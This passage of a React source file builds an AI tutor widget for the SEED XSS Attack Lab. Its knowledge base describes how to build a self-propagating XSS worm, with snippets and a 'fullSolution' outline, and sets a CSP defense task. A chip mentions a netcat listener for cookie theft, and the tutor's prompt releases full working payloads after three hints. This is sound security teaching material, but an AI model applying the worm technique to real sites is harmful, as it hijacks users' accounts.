    theory: "A worm copies its own code into each victim's profile. The trick is giving the script tag id='worm', then reading its own innerHTML via document.getElementById('worm').innerHTML. encodeURIComponent() is required before embedding the code in the POST body — without it, characters like < > \" & break the form encoding. The worm spreads exponentially: Samy→Alice→Charlie→...",
    objective: "Build a DOM-based self-propagating worm. Verify Samy infects Alice and Alice infects Charlie.",
    hints: [
      "How can a script know what its own code is? Think about reading from the DOM itself.",
      "Give your <script> tag an id attribute. Then document.getElementById('worm').innerHTML gives you the script's own body.",
      "What happens to characters like < > \" when embedded in a URL-encoded form body? Use encodeURIComponent() around the worm code.",
    ],
    commonMistakes: [
      "Double-encoding: applying encodeURIComponent twice → %253C instead of %3C → browser won't parse as script",
      "Forgetting id='worm' on the script tag — getElementById returns null",
      "Not verifying chain propagation — must check Charlie visits Alice's profile, not Samy's",
      "Worm code corrupted by TinyMCE — must tick Edit HTML",
    ],
    fullSolution: "Script reads its own code: headerTag + innerHTML + tailTag. Wraps in encodeURIComponent. Posts to /action/profile/edit. Has samyGuid guard. Chain: Samy saves worm → Alice visits Samy → Alice's profile infected → Charlie visits Alice → Charlie infected.",
  },
  task6: {
    name: "Task 6 — CSP Defense",
    theory: "Content Security Policy (CSP) is an HTTP response header that tells the browser which sources are trusted for scripts, styles, and other resources. 'self' means only the same origin. A nonce is a random value: the server puts nonce-XYZ in the CSP header, and only script tags with nonce='XYZ' are allowed to execute. This lets one specific trusted inline script run without opening the door to ALL inline scripts.",
    objective: "Configure Apache's CSP header on example32b to block injected inline scripts while allowing scripts from example60.com and example70.com.",
    hints: [
      "What HTTP header controls which script sources the browser trusts?",
      "The directive is: Content-Security-Policy: default-src 'self'; script-src 'self' *.example60.com *.example70.com — all on ONE line.",
      "Why does splitting into two script-src lines break it? Because HTTP headers: the last directive wins and overwrites the first.",
    ],
    commonMistakes: [
      "Two separate script-src lines — only the last one takes effect",
      "Not restarting Apache after editing — `service apache2 restart`",
      "Adding 'unsafe-inline' — this defeats CSP entirely, allows all inline scripts",
      "Using allow-src instead of script-src — wrong directive name",
    ],
    fullSolution: "In Apache config: Header set Content-Security-Policy \"default-src 'self'; script-src 'self' *.example60.com *.example70.com\" — one line, then restart Apache.",
  },
};

// ── XP TABLE ─────────────────────────────────────────────────────────────────
const MENTOR_XP = {
  solveNoHints: 100,
  hint1: -10,
  hint2: -20,
  hint3: -30,
  fullSolution: -80,
};

// ── SYSTEM PROMPT BUILDER ─────────────────────────────────────────────────────
function buildSystemPrompt(currentTask, studentState, labContext) {
  return `You are CyberMentor — an expert cybersecurity teaching assistant embedded in an XSS Attack Lab (SEED Labs 20.04 curriculum). You are a mentor, not a solution dispenser.

CURRENT LAB CONTEXT:
Task: ${labContext?.name || currentTask}
Theory: ${labContext?.theory || ""}
Objective: ${labContext?.objective || ""}
Common Mistakes: ${labContext?.commonMistakes?.join("; ") || ""}

STUDENT STATE:
- Name: ${studentState.name}
- Current task: ${studentState.currentTask}
- Hint level used: ${studentState.hintLevel}/3
- Failed attempts: ${studentState.failedAttempts}
- XP: ${studentState.xp}
- Has asked for full solution: ${studentState.askedForSolution}

YOUR RULES — follow all of these strictly:
1. NEVER reveal the full solution unless the student has already used all 3 hints AND explicitly asks again.
2. Start with conceptual questions that make the student think ("What does this tag do?", "What HTTP method does a form use?").
3. If hintLevel = 0: Ask a guiding conceptual question. No code.
4. If hintLevel = 1: Give a directional hint (point to the right field/method/concept). No payload.
5. If hintLevel = 2: Give a partial payload or pseudocode. Explain what's missing.
6. If hintLevel = 3: Give the full working payload WITH a detailed explanation of each line.
7. When the student is frustrated, acknowledge it warmly first ("XSS worms are genuinely tricky — you're close!").
8. After every response, suggest ONE concrete next action ("Try X and tell me what you see").
9. If the student shares an error message or their attempt, analyse it specifically. Name what's wrong.
10. Keep responses concise: max 150 words for concepts, max 200 words for debugging.
11. Use simple everyday words. Explain jargon immediately when you use it.
12. If a student asks about something outside XSS labs, gently redirect: "Let's focus on the lab — what's tripping you up?"

ANALOGIES TO USE:
- XSS payload = a note hidden in a letter that runs itself when someone else reads it
- netcat = a person holding out their hand waiting to catch — they must be ready BEFORE you throw
- CSRF token = a secret handshake the server checks on every sensitive action
- session cookie = a VIP badge the browser carries — stealing it = impersonating that user
- XSS worm = a photocopier that copies itself while editing your document
- CSP = a bouncer with a guestlist — only approved scripts get in

FORMAT:
- Use **bold** for key terms
- Use numbered lists for steps
- Use \`code\` for payloads
- End with: "Try that and tell me what you see! 🔍"`;
}

// ── BADGE DEFINITIONS ─────────────────────────────────────────────────────────
const BADGES = [
  { id: "first_question",  label: "Curious Hacker",  emoji: "🔍", condition: (s) => s.totalQuestions >= 1 },
  { id: "no_hints_t1",     label: "Self-Sufficient",  emoji: "💪", condition: (s) => s.solvedWithoutHints >= 1 },
  { id: "hint_3_used",     label: "Persistent",       emoji: "🦾", condition: (s) => s.hintLevel >= 3 },
  { id: "xp_500",          label: "Half-Century",     emoji: "🏅", condition: (s) => s.xp >= 500 },
  { id: "debugger",        label: "Bug Hunter",       emoji: "🐛", condition: (s) => s.failedAttempts >= 3 },
];

// ── MAIN WIDGET COMPONENT ─────────────────────────────────────────────────────
function CyberMentorWidget({ currentTaskId = "task1", studentName = "Student", labXP = 0 }) {
  // RECTANGLE MODE — replaces round FAB with a tall side panel toggle
  const { useState: uState, useRef: uRef, useEffect: uEffect, useCallback: uCallback, useMemo: uMemo } = React;

  // ── State ──
  const [isOpen,     setIsOpen]     = uState(false);
  const [messages,   setMessages]   = uState([]);
  const [input,      setInput]      = uState("");
  const [loading,    setLoading]    = uState(false);
  const [tab,        setTab]        = uState("chat"); // "chat" | "progress"
  const [toastMsg,   setToastMsg]   = uState(null);
  const [earned,     setEarned]     = uState(null);   // XP earned flash

  // ── Student state (persistent in sessionStorage) ──
  const [studentState, setStudentState] = uState(() => {
    try {
      const saved = sessionStorage.getItem("cybermentor_state");
      if (saved) return JSON.parse(saved);
    } catch {}
    return {
      name: studentName,
      currentTask: currentTaskId,
      hintLevel: 0,
      failedAttempts: 0,
      xp: 0,
      askedForSolution: false,
      solvedWithoutHints: 0,
      totalQuestions: 0,
      badges: [],
      taskHistory: {},
    };
  });

  const historyRef = uRef([]); // Gemini conversation history
  const bottomRef  = uRef(null);
  const inputRef   = uRef(null);

  // Persist state
  uEffect(() => {
    try { sessionStorage.setItem("cybermentor_state", JSON.stringify(studentState)); } catch {}
  }, [studentState]);

  // Sync taskId changes
  uEffect(() => {
    if (studentState.currentTask !== currentTaskId) {
      setStudentState(s => ({ ...s, currentTask: currentTaskId, hintLevel: 0, askedForSolution: false }));
      historyRef.current = [];
      if (isOpen) showWelcome(currentTaskId);
    }
  }, [currentTaskId]);

  // Auto scroll
  uEffect(() => { bottomRef.current?.scrollIntoView({ behavior: "smooth" }); }, [messages]);

  // Show welcome on open
  uEffect(() => {
    if (isOpen && messages.length === 0) showWelcome(currentTaskId);
  }, [isOpen]);

  // Badge checker
  uEffect(() => {
    BADGES.forEach(badge => {
      if (!studentState.badges.includes(badge.id) && badge.condition(studentState)) {
        setStudentState(s => ({ ...s, badges: [...s.badges, badge.id] }));
        showToast(`🏅 Badge earned: ${badge.label} ${badge.emoji}`);
      }
    });
  }, [studentState.totalQuestions, studentState.xp, studentState.hintLevel, studentState.failedAttempts]);

  function showToast(msg) {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 3500);
  }

  function showWelcome(taskId) {
    const ctx = LAB_KNOWLEDGE[taskId];
    const welcome = {
      id: "welcome",
      role: "assistant",
      content: `Hey ${studentName}! 👋 I'm **CyberMentor** — your guide through this lab.\n\nI won't just hand you answers — I'll help you figure them out. That's how the knowledge sticks!\n\n**Current task:** ${ctx?.name || taskId}\n**Objective:** ${ctx?.objective || "See the task guide on the left."}\n\nWhat's giving you trouble? Or just ask "where do I start?" 🚀`,
      ts: now(),
    };
    setMessages([welcome]);
  }

  function now() {
    return new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" });
  }

  // ── Hint level logic ──
  function detectHintRequest(text) {
    const lower = text.toLowerCase();
    if (/give me the (answer|solution|payload|code)|just tell me|full solution|i give up|show me how/i.test(text)) return "solution";
    if (/hint|stuck|help|don't (know|understand)|what do i do|how do i|can you show|next step/i.test(text)) return "hint";
    if (/wrong|error|not working|broken|failed|doesn't work|won't fire|nothing happens/i.test(text)) return "debug";
    return "question";
  }

  function computeXpDelta(requestType, hintLevel) {
    if (requestType === "solution") return MENTOR_XP.fullSolution;
    if (requestType === "hint") {
      if (hintLevel === 0) return MENTOR_XP.hint1;
      if (hintLevel === 1) return MENTOR_XP.hint2;
      return MENTOR_XP.hint3;
    }
    return 0;
  }

  // ── Gemini API call (direct browser call) ──
  async function callGemini(userMessage, systemPrompt) {
    // Build contents array: system prompt as first user turn
    const contents = [
      { role: 'user',      parts: [{ text: systemPrompt }] },
      { role: 'model',     parts: [{ text: 'Understood. I am CyberMentor and I will follow all those rules.' }] },
      ...historyRef.current,
      { role: 'user',      parts: [{ text: userMessage }] },
    ];

    const url = 'https://generativelanguage.googleapis.com/v1beta/models/' + GEMINI_MODEL + ':generateContent?key=' + GEMINI_API_KEY;
    
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        contents,
        generationConfig: {
          temperature: 0.7,
          maxOutputTokens: 1024,
        }
      })
    });

    if (!res.ok) {
      const err = await res.json().catch(() => ({}));
      if (err?.error?.message?.includes('API_KEY') || err?.error?.message?.includes('not found')) {
        throw new Error('Invalid Gemini API key. Paste your key from https://aistudio.google.com/app/apikey into GEMINI_API_KEY constant.');
      }
      throw new Error(err?.error?.message || `HTTP ${res.status}`);
    }

    const data = await res.json();
    console.log('[CyberMentor] Gemini response:', data);
    
    // Handle various response formats
    let text = data.candidates?.[0]?.content?.parts?.[0]?.text;
    
    // If no response, check for errors in the response
    if (!text) {
      if (data.promptFeedback?.blockReason) {
        throw new Error(`Response blocked: ${data.promptFeedback.blockReason}`);
      }
      if (data.error) {
        throw new Error(data.error.message || JSON.stringify(data.error));
      }
      throw new Error(`Empty response from Gemini. Response: ${JSON.stringify(data).substring(0, 200)}`);
    }
    
    return text;
  }

  // ── Send message ──
  const send = uCallback(async (textOverride) => {
    const text = (textOverride ?? input).trim();
    if (!text || loading) return;

    setInput("");
    setLoading(true);

    const reqType = detectHintRequest(text);
    const xpDelta = computeXpDelta(reqType, studentState.hintLevel);
    const newHintLevel = reqType === "hint" ? Math.min(studentState.hintLevel + 1, 3) : studentState.hintLevel;
    const askedSol = reqType === "solution" ? true : studentState.askedForSolution;

    // Optimistic XP update
    if (xpDelta !== 0) {
      setEarned(xpDelta);
      setTimeout(() => setEarned(null), 2000);
    }

    const newState = {
      ...studentState,
      hintLevel: newHintLevel,
      askedForSolution: askedSol,
      xp: Math.max(0, studentState.xp + xpDelta),
      totalQuestions: studentState.totalQuestions + 1,
      failedAttempts: reqType === "debug" ? studentState.failedAttempts + 1 : studentState.failedAttempts,
    };
    setStudentState(newState);

    const userMsg = { id: Date.now(), role: "user", content: text, ts: now() };
    const loadingMsg = { id: "__loading__", role: "assistant", loading: true };
    setMessages(prev => [...prev, userMsg, loadingMsg]);

    const labCtx = LAB_KNOWLEDGE[currentTaskId] || {};
    const sysPrompt = buildSystemPrompt(currentTaskId, newState, labCtx);

    try {
      const reply = await callGemini(text, sysPrompt);

      historyRef.current = [
        ...historyRef.current,
        { role: "user",  parts: [{ text }] },
        { role: "model", parts: [{ text: reply }] },
      ];
      // Keep history trimmed to last 10 exchanges
      if (historyRef.current.length > 20) {
        historyRef.current = historyRef.current.slice(-20);
      }

      setMessages(prev => [
        ...prev.filter(m => m.id !== "__loading__"),
        { id: Date.now() + 1, role: "assistant", content: reply, ts: now() },
      ]);

      if (xpDelta !== 0) {
        showToast(`${xpDelta > 0 ? "+" : ""}${xpDelta} XP${xpDelta < 0 ? " (hint used)" : ""}`);
      }

    } catch (err) {
      setMessages(prev => [
        ...prev.filter(m => m.id !== "__loading__"),
        {
          id: Date.now() + 1, role: "assistant", error: true, ts: now(),
          content: `⚠️ **Gemini Error:** ${err.message}\n\nIf you see "API_KEY" in the error — paste your free key from https://aistudio.google.com into the GEMINI_API_KEY constant at the top of CyberMentor_Widget.jsx`,
        },
      ]);
    }

    setLoading(false);
    setTimeout(() => inputRef.current?.focus(), 80);
  }, [input, loading, currentTaskId, studentState]);

  // ── Quick chips ──
  const CHIPS = [
    { emoji: "🔰", label: "Where do I start?",        text: "I just opened this task. Where do I start?" },
    { emoji: "🐛", label: "Nothing is working",        text: "I tried the payload but nothing is happening. What could be wrong?" },
    { emoji: "📝", label: "What is Edit HTML?",        text: "What is the Edit HTML checkbox and why do I need it?" },
    { emoji: "🍪", label: "netcat shows nothing",      text: "I ran nc -lknv 5555 but nothing appears when Alice visits the profile. Help?" },
    { emoji: "🔒", label: "What is a CSRF token?",     text: "What are __elgg_ts and __elgg_token and why does the payload need them?" },
    { emoji: "🪱", label: "Worm stops at Alice",       text: "The worm infected Alice but when Charlie visits Alice, Charlie is not infected. Why?" },
    { emoji: "💡", label: "Give me a hint",            text: "I'm stuck, can I get a hint for this task?" },
  ];

  // ── Markdown renderer ──
  function renderMsg(text) {
    return text.split("\n").map((line, i) => {
      if (line.startsWith("**") && line.endsWith("**") && line.length > 4) {
        return <div key={i} style={{ fontWeight: 700, color: "#fff", marginBottom: 3 }}>{line.slice(2, -2)}</div>;
      }
      // Inline bold + code
      const parts = line.split(/(`[^`]+`|\*\*[^*]+\*\*)/g);
      const rendered = parts.map((p, pi) => {
        if (p.startsWith("`") && p.endsWith("`") && p.length > 2)
          return <code key={pi} style={{ fontFamily: "monospace", fontSize: 11, background: "rgba(255,255,255,0.1)", padding: "1px 5px", borderRadius: 3, color: "#79c0ff" }}>{p.slice(1, -1)}</code>;
        if (p.startsWith("**") && p.endsWith("**") && p.length > 4)
          return <strong key={pi} style={{ color: "#fff" }}>{p.slice(2, -2)}</strong>;
        return p;
      });
      if (line.startsWith("- ") || line.startsWith("• "))
        return <div key={i} style={{ display: "flex", gap: 6, marginBottom: 3 }}><span style={{ color: "#00d4aa", flexShrink: 0 }}>·</span><span>{rendered.slice(1)}</span></div>;
      const numMatch = line.match(/^(\d+)\.\s/);
      if (numMatch)
        return <div key={i} style={{ display: "flex", gap: 8, marginBottom: 3, alignItems: "flex-start" }}><span style={{ color: "#00d4aa", fontWeight: 700, fontSize: 11, minWidth: 16 }}>{numMatch[1]}.</span><span>{rendered.slice(1)}</span></div>;
      if (line === "") return <div key={i} style={{ height: 6 }} />;
      return <div key={i} style={{ marginBottom: 2, lineHeight: 1.6 }}>{rendered}</div>;
    });
  }

  // ── Progress tab content ──
  const earnedBadges = BADGES.filter(b => studentState.badges.includes(b.id));
  const allBadges    = BADGES;
  const hintPct      = studentState.hintLevel === 0 ? 100 : studentState.hintLevel === 1 ? 70 : studentState.hintLevel === 2 ? 40 : 10;

  // ── Styles (inline, no external deps) ──
  const S = {
    widget: {
      position: "fixed", bottom: 0, right: 0, zIndex: 99999,
      display: "flex", flexDirection: "row", alignItems: "flex-end",
      fontFamily: "system-ui, -apple-system, sans-serif",
    },
    fab: {
      width: 36, height: 120, borderRadius: "10px 0 0 10px",
      background: "linear-gradient(180deg, #00d4aa, #0099ff)",
      border: "none", cursor: "pointer", fontSize: 13, fontWeight: 800,
      display: "flex", flexDirection: "column", alignItems: "center",
      justifyContent: "center", gap: 6, color: "#0d1117",
      boxShadow: "-4px 0 20px rgba(0,212,170,0.35)",
      transition: "width 0.2s",
      writingMode: "vertical-rl", letterSpacing: 2,
      paddingBottom: 8,
    },
    panel: {
      width: 400, height: "100vh", borderRadius: "12px 0 0 12px",
      background: "#0d1117", border: "1px solid #30363d",
      borderRight: "none",
      display: "flex", flexDirection: "column", overflow: "hidden",
      boxShadow: "-8px 0 40px rgba(0,0,0,0.7), 0 0 0 1px rgba(0,212,170,0.12)",
      animation: "cmSlideIn 0.28s ease",
    },
    header: {
      background: "#161b22", borderBottom: "1px solid #30363d",
      padding: "10px 14px", flexShrink: 0,
    },
    tabBar: {
      display: "flex", gap: 2, marginTop: 8,
    },
    tab: (active) => ({
      flex: 1, padding: "4px 0", borderRadius: 6, border: "none",
      background: active ? "rgba(0,212,170,0.15)" : "transparent",
      color: active ? "#00d4aa" : "#6e7681",
      fontSize: 11, fontWeight: active ? 700 : 400, cursor: "pointer",
      fontFamily: "inherit",
    }),
    messages: {
      flex: 1, overflowY: "auto", padding: "12px 14px",
      display: "flex", flexDirection: "column", gap: 8,
    },
    bubble: (isUser, isErr) => ({
      maxWidth: "88%",
      alignSelf: isUser ? "flex-end" : "flex-start",
      background: isUser ? "rgba(88,166,255,0.12)" : isErr ? "rgba(248,81,73,0.08)" : "#1c2333",
      border: `1px solid ${isUser ? "rgba(88,166,255,0.25)" : isErr ? "rgba(248,81,73,0.3)" : "#21262d"}`,
      borderRadius: isUser ? "14px 4px 14px 14px" : "4px 14px 14px 14px",
      padding: "9px 12px", fontSize: 12, color: "#c9d1d9",
      lineHeight: 1.6,
    }),
    inputArea: {
      borderTop: "1px solid #30363d", background: "#161b22",
      padding: "10px 12px", flexShrink: 0,
      display: "flex", gap: 8, alignItems: "flex-end",
    },
    textarea: {
      flex: 1, background: "#0d1117", border: "1px solid #30363d",
      borderRadius: 10, padding: "8px 12px", color: "#e6edf3",
      fontSize: 12, fontFamily: "inherit", resize: "none",
      outline: "none", lineHeight: 1.5, maxHeight: 80,
    },
    sendBtn: (canSend) => ({
      width: 34, height: 34, borderRadius: 8, border: "none", flexShrink: 0,
      background: canSend ? "#00d4aa" : "rgba(255,255,255,0.05)",
      color: canSend ? "#0d1117" : "#6e7681",
      cursor: canSend ? "pointer" : "default",
      display: "flex", alignItems: "center", justifyContent: "center",
      fontSize: 16, transition: "all 0.15s",
    }),
  };

  const taskCtx = LAB_KNOWLEDGE[currentTaskId];

  return (
    <div style={S.widget}>
      <style>{`
        @keyframes cmSlideIn { from { opacity:0; transform:translateX(40px); } to { opacity:1; transform:translateX(0); } }
        .cm-fab:hover { width: 42px !important; box-shadow: -6px 0 28px rgba(0,212,170,0.55) !important; }
        .cm-send:hover:not(:disabled) { background: #00bda0 !important; transform: scale(1.05); }
        .cm-chip:hover { background: rgba(0,212,170,0.12) !important; border-color: rgba(0,212,170,0.4) !important; color: #00d4aa !important; }
        .cm-scroll::-webkit-scrollbar { width: 4px; } .cm-scroll::-webkit-scrollbar-thumb { background: #30363d; border-radius: 2px; }
        @keyframes cmXpPop { 0%{opacity:0;transform:translateY(8px)} 20%{opacity:1;transform:translateY(-4px)} 80%{opacity:1} 100%{opacity:0;transform:translateY(-20px)} }
        .cm-xppop { animation: cmXpPop 2s ease forwards; position: absolute; top: -24px; right: 8px; font-size: 13px; font-weight: 800; pointer-events: none; }
      `}</style>

      {/* Toast */}
      {toastMsg && (
        <div style={{ position: "fixed", top: 16, right: isOpen ? 412 : 48, animation: "cmSlideIn 0.3s ease", maxWidth: 280, zIndex: 99999, background: "#1c2333", border: "1px solid #00d4aa", borderRadius: 8, padding: "8px 14px", fontSize: 12, color: "#e6edf3", fontWeight: 600, boxShadow: "0 4px 16px rgba(0,0,0,0.4)", textAlign: "center" }}>
          {toastMsg}
        </div>
      )}

      {/* Chat panel */}
      {isOpen && (
        <div style={S.panel}>
          {/* Header */}
          <div style={S.header}>
            <div style={{ display: "flex", alignItems: "center", justifyContent: "space-between" }}>
              <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
                <div style={{ width: 34, height: 34, borderRadius: "50%", background: "rgba(0,212,170,0.15)", border: "1px solid rgba(0,212,170,0.3)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 18 }}>🤖</div>
                <div>
                  <div style={{ fontSize: 13, fontWeight: 800, color: "#fff" }}>CyberMentor</div>
                  <div style={{ fontSize: 10, color: "#00d4aa", display: "flex", alignItems: "center", gap: 5 }}>
                    <span style={{ width: 5, height: 5, borderRadius: "50%", background: "#00d4aa", display: "inline-block" }} />
                    Gemini · Task {currentTaskId.replace("task", "")} · {studentState.xp} XP
                  </div>
                </div>
              </div>
              <div style={{ display: "flex", gap: 6, alignItems: "center", position: "relative" }}>
                {earned && (
                  <span className="cm-xppop" style={{ color: earned > 0 ? "#00d4aa" : "#f85149" }}>
                    {earned > 0 ? "+" : ""}{earned} XP
                  </span>
                )}
                <button onClick={() => { setMessages([]); historyRef.current = []; setTimeout(() => showWelcome(currentTaskId), 50); }} style={{ background: "transparent", border: "1px solid #30363d", color: "#6e7681", borderRadius: 6, padding: "3px 8px", cursor: "pointer", fontSize: 10, fontFamily: "inherit" }}>🗑</button>
                <button onClick={() => setIsOpen(false)} style={{ background: "transparent", border: "1px solid #30363d", color: "#6e7681", borderRadius: 6, padding: "3px 8px", cursor: "pointer", fontSize: 14, lineHeight: 1, fontFamily: "inherit" }}>×</button>
              </div>
            </div>
            {/* Tab bar */}
            <div style={S.tabBar}>
              {[["chat", "💬 Chat"], ["progress", "📊 Progress"]].map(([id, label]) => (
                <button key={id} onClick={() => setTab(id)} style={S.tab(tab === id)}>{label}</button>
              ))}
            </div>
          </div>

          {/* Chat tab */}
          {tab === "chat" && (
            <>
              <div className="cm-scroll" style={S.messages}>
                {messages.map(msg => (
                  <div key={msg.id} style={{ display: "flex", flexDirection: "column", alignItems: msg.role === "user" ? "flex-end" : "flex-start" }}>
                    {msg.loading ? (
                      <div style={{ ...S.bubble(false, false), display: "flex", alignItems: "center", gap: 6 }}>
                        {[0, 1, 2].map(i => (
                          <span key={i} style={{ width: 6, height: 6, borderRadius: "50%", background: "#00d4aa", display: "inline-block", animation: `cmDot 1.2s ${i * 0.18}s ease-in-out infinite` }} />
                        ))}
                        <style>{`@keyframes cmDot { 0%,80%,100%{transform:scale(0.6);opacity:0.4} 40%{transform:scale(1);opacity:1} }`}</style>
                      </div>
                    ) : (
                      <div style={S.bubble(msg.role === "user", msg.error)}>
                        {renderMsg(msg.content)}
                      </div>
                    )}
                    {msg.ts && <div style={{ fontSize: 9, color: "#6e7681", marginTop: 3, paddingLeft: 4 }}>{msg.ts}</div>}
                  </div>
                ))}

                {/* Quick chips shown only at start */}
                {messages.length <= 1 && !loading && (
                  <div style={{ marginTop: 8 }}>
                    <div style={{ fontSize: 9, fontWeight: 700, textTransform: "uppercase", letterSpacing: 1.5, color: "#6e7681", marginBottom: 8 }}>Quick questions</div>
                    <div style={{ display: "flex", flexWrap: "wrap", gap: 6 }}>
                      {CHIPS.map((c, i) => (
                        <button key={i} className="cm-chip" onClick={() => send(c.text)}
                          style={{ background: "#161b22", border: "1px solid #30363d", color: "#8b949e", borderRadius: 20, padding: "4px 10px", fontSize: 11, cursor: "pointer", fontFamily: "inherit", display: "flex", alignItems: "center", gap: 5, transition: "all 0.15s" }}>
                          <span>{c.emoji}</span> <span>{c.label}</span>
                        </button>
                      ))}
                    </div>
                  </div>
                )}
                <div ref={bottomRef} />
              </div>

              {/* Input */}
              <div style={S.inputArea}>
                <textarea
                  ref={inputRef}
                  value={input}
                  onChange={e => setInput(e.target.value)}
                  onKeyDown={e => { if (e.key === "Enter" && !e.shiftKey) { e.preventDefault(); send(); } }}
                  placeholder="Ask anything… (Enter to send)"
                  rows={1}
                  disabled={loading}
                  className="cm-scroll"
                  style={S.textarea}
                  onInput={e => { e.target.style.height = "auto"; e.target.style.height = Math.min(e.target.scrollHeight, 80) + "px"; }}
                />
                <button className="cm-send" onClick={() => send()} disabled={!input.trim() || loading} style={S.sendBtn(!!input.trim() && !loading)}>
                  {loading ? "⏳" : "➤"}
                </button>
              </div>
            </>
          )}

          {/* Progress tab */}
          {tab === "progress" && (
            <div className="cm-scroll" style={{ flex: 1, overflowY: "auto", padding: 16, display: "flex", flexDirection: "column", gap: 14 }}>
              {/* XP card */}
              <div style={{ background: "#161b22", border: "1px solid #30363d", borderRadius: 10, padding: 14 }}>
                <div style={{ fontSize: 10, textTransform: "uppercase", letterSpacing: 1.5, color: "#6e7681", marginBottom: 6 }}>Mentor Session XP</div>
                <div style={{ fontSize: 28, fontWeight: 900, color: "#00d4aa" }}>{studentState.xp} XP</div>
                <div style={{ fontSize: 10, color: "#8b949e", marginTop: 4 }}>Lab XP: {labXP} · Total: {studentState.xp + labXP}</div>
              </div>

              {/* Hint usage */}
              <div style={{ background: "#161b22", border: "1px solid #30363d", borderRadius: 10, padding: 14 }}>
                <div style={{ fontSize: 10, textTransform: "uppercase", letterSpacing: 1.5, color: "#6e7681", marginBottom: 8 }}>Hint Level — Task {currentTaskId.replace("task", "")}</div>
                <div style={{ display: "flex", gap: 6, marginBottom: 8 }}>
                  {[1, 2, 3].map(level => (
                    <div key={level} style={{ flex: 1, height: 6, borderRadius: 99, background: studentState.hintLevel >= level ? "#f85149" : "#21262d" }} />
                  ))}
                </div>
                <div style={{ fontSize: 11, color: "#8b949e" }}>
                  {studentState.hintLevel === 0 && "No hints used yet — full XP available! 🏆"}
                  {studentState.hintLevel === 1 && "Hint 1 used (-10 XP)"}
                  {studentState.hintLevel === 2 && "Hint 2 used (-30 XP total)"}
                  {studentState.hintLevel >= 3 && "Hint 3 used — partial payload revealed (-60 XP total)"}
                </div>
              </div>

              {/* XP table */}
              <div style={{ background: "#161b22", border: "1px solid #30363d", borderRadius: 10, padding: 14 }}>
                <div style={{ fontSize: 10, textTransform: "uppercase", letterSpacing: 1.5, color: "#6e7681", marginBottom: 8 }}>XP Rules</div>
                {[["Solve without hints", "+100"], ["Ask hint 1", "-10"], ["Ask hint 2", "-20"], ["Ask hint 3", "-30"], ["Ask full solution", "-80"]].map(([action, xp]) => (
                  <div key={action} style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: "#8b949e", marginBottom: 5 }}>
                    <span>{action}</span>
                    <span style={{ fontWeight: 700, color: xp.startsWith("+") ? "#00d4aa" : "#f85149" }}>{xp} XP</span>
                  </div>
                ))}
              </div>

              {/* Badges */}
              <div style={{ background: "#161b22", border: "1px solid #30363d", borderRadius: 10, padding: 14 }}>
                <div style={{ fontSize: 10, textTransform: "uppercase", letterSpacing: 1.5, color: "#6e7681", marginBottom: 10 }}>Badges</div>
                <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
                  {allBadges.map(badge => {
                    const earned = studentState.badges.includes(badge.id);
                    return (
                      <div key={badge.id} style={{ padding: "5px 10px", borderRadius: 20, background: earned ? "rgba(0,212,170,0.1)" : "rgba(255,255,255,0.03)", border: `1px solid ${earned ? "rgba(0,212,170,0.35)" : "#30363d"}`, fontSize: 11, color: earned ? "#00d4aa" : "#6e7681", display: "flex", alignItems: "center", gap: 5, opacity: earned ? 1 : 0.5 }}>
                        <span>{badge.emoji}</span> <span>{badge.label}</span>
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Stats */}
              <div style={{ background: "#161b22", border: "1px solid #30363d", borderRadius: 10, padding: 14 }}>
                <div style={{ fontSize: 10, textTransform: "uppercase", letterSpacing: 1.5, color: "#6e7681", marginBottom: 8 }}>Session Stats</div>
                {[["Questions asked", studentState.totalQuestions], ["Debugging attempts", studentState.failedAttempts], ["Badges earned", studentState.badges.length + "/" + BADGES.length]].map(([label, val]) => (
                  <div key={label} style={{ display: "flex", justifyContent: "space-between", fontSize: 11, color: "#8b949e", marginBottom: 5 }}>
                    <span>{label}</span><span style={{ fontWeight: 700, color: "#e6edf3" }}>{val}</span>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* Rectangle toggle tab */}
      <button
        className="cm-fab"
        onClick={() => setIsOpen(o => !o)}
        style={S.fab}
        title={isOpen ? "Close CyberMentor" : "Open AI Tutor"}
      >
        {isOpen ? "✕" : "🤖"}
        <span style={{ fontSize: 9, letterSpacing: 1.5, opacity: 0.85 }}>
          {isOpen ? "CLOSE" : "AI\nTUTOR"}
        </span>
      </button>
    </div>
  );
}

window.CyberMentorWidget = CyberMentorWidget;

// ══════════════════════════════════════════════════════════════════════════════
// HOW TO WIRE IT INTO XSSLab:
//
// In your XSSLab component's return(), find the last </>  and add this
// JUST BEFORE it:
//
//   <CyberMentorWidget
//     currentTaskId={currentTaskId}
//     studentName={session?.studentName || "Student"}
//     labXP={totalScore}
//   />
//
// That's it. The widget is fully self-contained.
// ══════════════════════════════════════════════════════════════════════════════